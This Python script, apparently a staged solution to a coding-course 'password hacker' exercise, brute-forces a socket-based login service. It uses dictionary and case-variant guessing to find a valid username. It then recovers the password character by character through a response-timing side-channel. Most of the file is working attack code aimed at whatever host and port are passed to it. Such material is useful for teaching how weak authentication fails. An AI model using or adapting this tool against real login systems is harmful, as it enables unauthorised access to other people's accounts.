import socket
import sys
from itertools import product
import string
import os
import json
from time import perf_counter


# Stage 1/5
# def test_response(data, socket_, expected_messages, recv=1024):
#     """
#     send data over socket and test if server response is equal to the expected message.
#     @param data: data to send. Must be a string.
#     @param socket_: socket with the established connection
#     @param expected_messages: list with expected responses from server to consider a success
#     @param recv: receiving buffer size. default=1024
#     @return: success (bool), response_from_server (str)
#     """
#     socket_.send(data.encode())
#     resp = socket_.recv(recv).decode()
#     resp = json.loads(resp)
#     return resp["result"] in expected_messages, resp["result"]


# Stage 2/5
def brute_force(max_length, characters=string.ascii_lowercase + string.digits + string.ascii_uppercase):
    """
    @param max_length: maximum length of word to try. All words formed will be shorter or equal to this length.
    @param characters: character set to use. By default, ASCII uppercase, ASCII lowercase and digits 0-9 will be used.
    """
    for length in range(1, max_length + 1):
        iter_ = product(characters, repeat=length)
        for combination in iter_:
            word = ''.join(combination)
            yield word


# Stage 3/5
def caps_word_dict(dictionary_path):
    """
    attempts are combinations of the words in the dictionary
    but with all combinations of upper and lowercase for each word
    """
    with open(dictionary_path, "r") as f:
        passwords = f.readlines()
    for word in passwords:
        word2 = word.replace("\n", "")
        iter_ = product(*([letter.lower(), letter.upper()] if letter.isalpha() else [letter] for letter in word2))
        for word3 in iter_:
            yield ''.join(word3)


def normal_dict(dictionary_path):
    """
    attempts are words taken from a dictionary file, one line per word
    """
    with open(dictionary_path, "r") as f:
        passwords = f.readlines()
    for word in passwords:
        word2 = word.replace("\n", "")
        yield ''.join(word2)


# Stage 4/5
def login_pass_attempt(socket_: object, iterator_: object,
                       expected_messages: list, key: str = "login",
                       login_JSON: object = None, attempts: int = 1000000,
                       response_time: int = None) -> object:
    """
    Attempt to hack a login using 'iterator_' parameter to iterate the value specified in 'key' until
    server response is equal to 'expected_message'.

    @param socket_: the socket with the established connection.
    @param iterator_: the iterator to the generating function of the words to try.
    @param expected_messages: list with the expected possible responses from server when the attempt is correct.
    @param key: which parameter to iterate. Must be a key present in the login JSON object (dictionary).
    @param login_JSON: by default a dictionary with the keys {"login": " ", "password": " "}
    @param attempts: maximum attempts
    @param response_time: server response time for a normal denied password. If None, server response delay
    not taken into account as success. If response_time=0 will be determined automatically.
    @return:    ok (boolean):       True if succeeded within the maximum allowed attempts.
                login_JSON (dict):  The object for which the attempt was successful.
                r(str):             Response message from server
                attempts(int):      Remaining attempts.
    """

    if login_JSON is None:
        login_JSON = {"login": " ", "password": " "}
        login_JSON[key] = next(iterator_)
        # perform an attempt to test correct format of JSON object.
        attempts -= 1
        data = json.dumps(login_JSON)
        ok, r, response_time = test_response(data, socket_, expected_messages, exception_time_response=response_time)
        if (not ok) and (r == "Bad request!"):
            print("Incorrect JSON format!")
            return ok, login_JSON, r, attempts

    if (response_time is not None) and (response_time == 0):
        log_response = True
        resp_log = []
    else:
        log_response = False

    # initiate the hacking
    ok = False
    r = ""
    while (attempts > 0) and not ok:
        attempts -= 1
        try:
            login_JSON[key] = next(iterator_)
        except StopIteration:
            if not log_response:
                print("Iteration stopped. The guessed word probably contains "
                      "characters not present in the specified set.")
            break
        data = json.dumps(login_JSON)
        ok, r, resp_time = test_response(data, socket_, expected_messages,
                                             exception_time_response=response_time)
        if log_response:
            resp_log.append(resp_time)
    if log_response:
        resp_time = (min(resp_log), max(resp_log))
    return ok, login_JSON, r, attempts, resp_time


# Stage 4/5
def brute_force_fix_first(fix_part: str = "", characters: list = string.ascii_lowercase
                        + string.digits
                        + string.ascii_uppercase) -> object:
    """
    Generate a word to try the hack, where the first part of the string is fixed and the rest of the string is generated
    one character at a time.

    @param fix_part: string to prepend to the character generated.
    @param characters: set of characters to try.
    """
    for word in product(characters, repeat=1):
        yield ''.join([fix_part, ''.join(word)])


# Stage 5/5: Exploit exception catch time difference.


def test_response(data, socket_, expected_messages, recv=1024, exception_time_response=None):
    """
    send data over socket and test if server response is equal to the expected message.
    @param data: data to send. Must be a string.
    @param socket_: socket with the established connection
    @param expected_messages: list with expected responses from server to consider a success
    @param recv: receiving buffer size. default=1024
    @return: success (bool), response_from_server (str)
    """
    socket_.send(data.encode())
    if exception_time_response is not None:
        start = perf_counter()
        resp = socket_.recv(recv)
        end = perf_counter()
        response_time = (end - start)
        resp = resp.decode()
        resp = json.loads(resp)
        return (resp["result"] in expected_messages) or (0< exception_time_response < response_time), \
            resp["result"], response_time
    else:
        resp = socket_.recv(recv)
        resp = resp.decode()
        try:
            resp = json.loads(resp)
        except json.JSONDecodeError:
            print("JSONDecodeError:", print(resp))
        return resp["result"] in expected_messages, resp["result"], None


login_dictionary_path = os.path.join(os.getcwd(), "hacking", "logins.txt")
password_dictionary_path = os.path.join(os.getcwd(), "hacking", "passwords.txt")


# Stage 2/5
# my_iter = brute_force(7, characters = string.ascii_lowercase + string.digits)

# Stage 3/5
# my_iter = caps_word_dict(dictionary_path)


hostname = sys.argv[1]
port = int(sys.argv[2])

#  Stage 4/5
# iter_login = normal_dict(login_dictionary_path)
# with socket.socket() as sk:
#     address = (hostname, port)
#     sk.connect(address)
#     success_login, login_pass, response, remaining_attempts = login_pass_attempt(sk, iter_login, ["Wrong password!"])
#     if success_login:
#         fixed_part = ""
#         while (response != "Connection success!") and (remaining_attempts > 0):
#             iter_password = brute_force_fix_first(fix_part=fixed_part)
#             success_password, login_pass, response, \
#                 remaining_attempts = login_pass_attempt(sk, iter_password,
#                                                         ["Exception happened during login", "Connection success!"],
#                                                         key="password",
#                                                         login_JSON=login_pass,
#                                                         attempts=remaining_attempts)
#             fixed_part = login_pass["password"]
#     if success_password:
#         print(json.dumps(login_pass, indent=4))
#     else:
#         print("Maximum attempts exceeded unsuccessfully.")


# Stage 5/5
iter_login = normal_dict(login_dictionary_path)
with socket.socket() as sk:
    address = (hostname, port)
    sk.connect(address)
    success_login, login_pass, response, \
        remaining_attempts, resp_time = login_pass_attempt(sk, iter_login, ["Wrong password!"])
    if success_login:
        fixed_part = ""
        # setting zero to the response time will cause the
        # function to search for min and max values for server response
        resp_time = 0
        fixed_part = ""
        iter_password = brute_force_fix_first(fix_part=fixed_part)
        success_password, login_pass, response, \
            remaining_attempts, resp_time = login_pass_attempt(sk, iter_password,
                                                               ["Connection success!"],
                                                               key="password",
                                                               login_JSON=login_pass,
                                                               attempts=remaining_attempts,
                                                               response_time=resp_time)
        # Mean value as limit reference: if server takes longer than this,
        # it caught an exception (correct characters at the beginning of password)
        resp_time_mean = (resp_time[0]+resp_time[1]) / 2
        fixed_part = ""
        while (response != "Connection success!") and (remaining_attempts > 0):
            iter_password = brute_force_fix_first(fix_part=fixed_part)
            success_password, login_pass, response, \
                remaining_attempts, resp_time = login_pass_attempt(sk, iter_password,
                                                        ["Connection success!"],
                                                        key="password",
                                                        login_JSON=login_pass,
                                                        attempts=remaining_attempts,
                                                                   response_time=resp_time_mean)
            fixed_part = login_pass["password"]
    if success_password:
        print(json.dumps(login_pass, indent=4))
    else:
        print("Maximum attempts exceeded unsuccessfully.")